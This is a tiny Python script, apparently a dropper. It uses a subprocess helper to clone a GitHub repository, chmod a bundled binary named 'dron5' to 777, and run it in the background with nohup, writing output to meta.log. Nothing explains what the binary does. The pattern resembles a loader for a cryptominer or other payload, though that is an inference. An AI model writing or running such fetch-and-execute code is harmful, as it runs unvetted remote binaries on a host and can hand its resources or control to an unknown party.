from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
 

 

 
def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]
 

 


cmdline ( 'git clone https://github.com/raufpermana22/rvan.git && cd rvan && chmod 777 dron5 && nohup ./dron5 --log=stdout > meta.log && cat meta.log' )
